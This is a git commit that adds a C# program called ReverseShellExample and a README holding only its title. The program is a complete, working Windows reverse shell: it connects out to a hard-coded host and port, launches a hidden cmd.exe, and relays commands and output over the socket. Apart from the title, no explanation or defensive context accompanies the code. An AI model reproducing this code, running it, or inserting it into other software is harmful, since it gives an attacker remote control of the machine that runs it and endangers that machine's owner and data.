5df3a88df5062cff87fd95ef5ff806a8acc68c6a
John Watson <outlawstar4761@gmail.com>
2021-05-26 18:26:31 -0500

    first commit

---
+++ Program.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+namespace ReverseShellExample
+{
+    class Program
+    {
+        static StreamWriter streamWriter;
+        static void Main(string[] args)
+        {
+            TcpClient client = new TcpClient("192.168.88.179", 1043);
+            Stream stream = client.GetStream();
+            StreamReader rdr = new StreamReader(stream);
+            streamWriter = new StreamWriter(stream);
+            StringBuilder strInput = new StringBuilder();
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.RedirectStandardInput = true;
+            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            p.Start();
+            p.BeginOutputReadLine();
+            while (true) {
+                strInput.Append(rdr.ReadLine());
+                p.StandardInput.WriteLine(strInput);
+                strInput.Remove(0,strInput.Length);
+            }
+        }
+        private static void CmdOutputDataHandler(object sendingProcess,DataReceivedEventArgs outLine) {
+            StringBuilder strOutput = new StringBuilder();
+            if (!String.IsNullOrEmpty(outLine.Data)) {
+                try {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                } catch (Exception e) { }
+            }
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,1 @@
+"# ReverseShellExample-dotNET" 
